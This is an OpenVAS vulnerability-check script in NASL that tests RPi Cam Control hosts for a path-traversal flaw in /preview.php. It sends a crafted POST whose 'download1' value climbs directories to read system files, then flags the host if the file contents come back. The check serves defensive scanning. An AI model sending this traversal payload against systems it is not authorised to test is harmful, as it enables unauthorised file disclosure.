###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_rpi_cam_control_multiple_vuln.nasl 12883 2018-12-27 08:13:02Z asteins $
#
# RPi Cam Control Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:rpi:cam_control";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.812362");
  script_version("$Revision: 12883 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-12-27 09:13:02 +0100 (Thu, 27 Dec 2018) $");
  script_tag(name:"creation_date", value:"2017-12-26 14:19:48 +0530 (Tue, 26 Dec 2017)");
  script_name("RPi Cam Control Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The host is running RPi Cam Control
  and is prone to multiple vulnerabilities");

  script_tag(name:"vuldetect", value:"Sends the crafted http POST request
  and checks whether it is able to read the file or not.");

  script_tag(name:"insight", value:"Multiple flaws exists due to multiple improper
  sanitization of input passed to 'download1' and 'convertCmd' parameters in
  '/preview.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read arbitrary files and also execute arbitrary commands on the
  affected system.");

  script_tag(name:"affected", value:"RPi Cam Control versions before 6.4.34.");

  script_tag(name:"solution", value:"Update to version 6.4.34 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42638");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_rpi_cam_control_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("RPi/Cam/Control/Installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if (!ripPort = get_app_port(cpe:CPE))
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  postData = "download1=../../../../../../../../../../../../../../../../" + file + ".v0000.t";
  req = http_post_req(port:ripPort, url:"/preview.php", data:postData,
        add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
  res = http_keepalive_send_recv(port:ripPort, data: req);

  if(res =~ "HTTP/1.. 200 OK" && egrep(string:res, pattern:pattern))
  {
    report = report_vuln_url(port:ripPort, url:"/preview.php");
    security_message(port:ripPort, data:report);
    exit(0);
  }
}

exit(99);
